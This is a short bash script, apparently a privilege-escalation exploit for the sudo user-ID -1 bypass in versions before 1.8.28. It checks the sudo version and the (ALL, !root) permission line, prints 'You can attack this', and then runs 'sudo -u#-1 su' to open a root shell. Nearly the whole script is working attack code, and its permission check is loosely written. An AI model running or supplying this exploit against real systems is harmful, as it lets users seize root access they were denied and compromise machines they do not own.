#! /bin/bash

sudo_version=$(sudo -V | head -n 1 | awk '{print $3}')
echo $sudo_version
min_version="1.8.28"
something=$(printf '%s\n' "$sudo_version" "$min_version" | sort -V | tail -n1)
if [[ "$something" == "$min_version" ]]; then
	echo "Your sudo version ($sudo_version) is older than $min_version. You can attack this"
else
	echo "Your sudo version ($sudo_version) is newer than $min_version. The vulnerability has been patched"
fi

perm_check=$(sudo -l | grep -E '(\(ALL\)|\(ALL, !root\))')
error_string="Sorry"

if grep -q "$error_string" <<< "$perm_check"; then
	echo "You do not have the proper permissions for this"
else
	sudo -u#-1 su
fi
